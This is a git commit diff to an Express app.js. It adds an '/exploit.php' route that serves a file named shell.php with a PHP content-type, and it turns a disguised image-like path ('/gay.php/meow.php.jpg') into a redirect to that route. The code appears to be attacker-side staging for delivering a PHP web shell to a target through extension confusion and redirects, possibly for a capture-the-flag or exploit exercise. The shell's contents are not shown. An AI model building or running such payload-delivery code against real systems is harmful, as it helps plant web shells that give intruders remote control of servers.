234a2ee2ca73ac54e23f68443bc618e74b58c253
jacopo luciani <78670280+lucianidev@users.noreply.github.com>
2025-02-11 19:11:48 +0100

    Update app.js

--- app.js
+++ app.js
@@ -3,9 +3,16 @@ const app = express();
 
 const PORT = 3000;
 
+app.get('/exploit.php', (req,res) => {
+  console.log(req.path);
+ res.setHeader('content-type', 'application/x-httpd-php');
+  res.sendFile(__dirname + '/public/shell.php');
+})
+
 app.get('/gay.php/meow.php.jpg', (req,res) => {
   console.log(req.path);
-  res.sendFile(__dirname + '/public/shell.php');
+ // res.setHeader('content-type', 'application/x-httpd-php');
+res.redirect('/exploit.php')
 })
 
 const server = app.listen(PORT, () => {
